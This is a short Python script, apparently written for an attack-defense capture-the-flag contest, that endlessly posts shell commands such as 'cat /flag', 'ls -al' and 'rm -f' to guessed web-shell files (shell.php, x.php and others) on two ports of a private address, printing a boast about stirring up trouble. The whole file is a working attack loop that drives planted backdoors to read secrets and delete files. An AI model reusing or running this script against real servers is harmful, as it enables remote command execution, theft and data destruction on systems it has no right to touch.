import requests
import time

def scan_attack():
    file={'shell.php','x.php','index.php','web.php','1.php'}
    payload={'cat /flag','ls -al','rm -f','echo 1'}
    while(1):
        for i in range(8802, 8804):
            for ii in file:
                url='http://192.168.76.156:'+ str(i)+'/'+ii
                for iii in payload:
                    data={
                        'payload':iii
                    }
                    try:
                        requests.post(url,data=data)
                        print("正在搅屎:"+str(i)+'|'+ii+'|'+iii)
                        time.sleep(0.5)
                    except Exception as e:
                        time.sleep(0.5)
                        pass


if __name__ == '__main__':
    scan_attack()